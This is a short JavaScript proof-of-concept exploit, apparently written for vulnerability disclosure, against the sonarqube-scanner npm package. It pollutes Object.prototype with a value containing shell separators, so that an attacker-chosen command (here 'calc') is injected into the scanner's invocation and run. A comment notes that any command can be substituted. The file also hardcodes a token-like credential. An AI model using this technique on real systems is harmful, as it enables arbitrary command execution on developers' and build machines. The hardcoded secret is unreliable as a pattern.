const scanner = require('sonarqube-scanner');


const sep = process.platform === 'win32' ? '&' : ';';
const payload = 'calc'; // you can use any arguments in the command 

Object.prototype.version = `${sep} ${payload}${sep} `; // or .SONAR_SCANNER_VERSION, .npm_config_sonar_scanner_version
// OR
// Object.prototype.basePath = `${payload}${sep}`; // or .SONAR_BINARY_CACHE, .npm_config_sonar_binary_cache

scanner(
  {
    serverUrl : 'https://sonarqube.mycompany.com',
    token : "019d1e2e04eefdcd0caee1468f39a45e69d33d3f",
    options: {
      'sonar.projectName': 'My App',
      'sonar.projectDescription': 'Description for "My App" project...',
      'sonar.sources': 'src',
      'sonar.tests': 'test'
    }
  },
  () => process.exit()
)